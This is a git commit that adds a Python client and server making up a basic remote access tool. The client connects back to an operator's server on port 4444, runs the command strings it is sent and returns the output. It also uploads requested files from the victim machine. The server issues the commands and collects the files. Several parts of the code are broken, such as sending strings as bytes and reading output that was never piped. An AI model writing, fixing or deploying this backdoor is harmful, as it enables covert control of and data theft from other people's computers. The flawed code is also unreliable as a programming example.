2e711f00d5a9eddaa11b308541ac9cdc53919d42
Ovusi <jakpornobert@gmail.com>
2020-11-27 13:47:21 +0100

    Initial commit

---
+++ client.py
@@ -0,0 +1,47 @@
+import subprocess
+import socket
+from time import *
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+SERVER_HOST = ''
+SERVER_PORT = 4444
+BUFFER_SIZE = 1024
+
+
+def upload():
+    file = sock.recv(BUFFER_SIZE)
+    f = open(file, 'rb')
+    i = f.read(BUFFER_SIZE)
+    while i:
+        sock.send(i)
+        i = f.read(BUFFER_SIZE)
+    f.close()
+    sock.send('Complete')
+
+
+def connect():
+    while True:
+        try:
+            print('Connecting to server...')
+            sock.connect((SERVER_HOST, SERVER_PORT))
+        except Exception as e:
+            print(e)
+            sleep(5)
+            connect()
+        else:
+            print('Connection Successful')
+            while True:
+                received = sock.recv(BUFFER_SIZE).decode()
+                if received == 'quit':
+                    sock.close()
+                elif received == 'download':
+                    sock.recv(received)
+                    upload()
+                else:
+                    result = subprocess.Popen(received, shell=False, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output = result.stdout.read() + result.stderr.read()
+                    sock.send(output)
+                    continue
+
+
+connect()
---
+++ server.py
@@ -0,0 +1,66 @@
+import sys
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+SERVER_HOST = '0.0.0.0'
+SERVER_PORT = 4444
+BUFFER_SIZE = 1024
+
+
+def download():
+    try:
+        f = input('Type file name: ')
+        file = str(f)
+        sock.send(file)
+        f = open(file, 'wb')
+        i = sock.recv(BUFFER_SIZE)
+        while not ('complete' in str(i)):
+            f.write(i)
+            i = sock.recv(BUFFER_SIZE)
+        f.close()
+    except Exception as e:
+        print(e)
+        intake = input('Try Again? [y/n] ')
+        if intake == 'n':
+            pass
+        elif intake == 'y':
+            download()
+        else:
+            print('Input incorrect')
+            pass
+
+
+def connect():
+    global sock
+    global SERVER_PORT
+    global SERVER_HOST
+    global BUFFER_SIZE
+
+    try:
+        sock.bind((SERVER_HOST, SERVER_PORT))
+        print(f'listening through {SERVER_HOST}:{SERVER_PORT}')
+        sock.listen(5)
+    except socket.error as e:
+        print(e)
+        connect()
+    else:
+        client_socket, client_address = sock.accept()
+        print(f'{client_socket}:{client_address} CONNECTED.')
+        while True:
+            cmd = input("Enter command [type 'quit' to end session]: ")
+            if cmd == 'quit':
+                print('SESSION CLOSED.')
+                client_socket.close()
+                sock.close()
+                sys.exit()
+            elif cmd == 'download':
+                client_socket.send(cmd)
+                download()
+            else:
+                client_socket.send(cmd.encode())
+                result = client_socket.recv(BUFFER_SIZE).decode()
+                print(result)
+            continue
+
+
+connect()
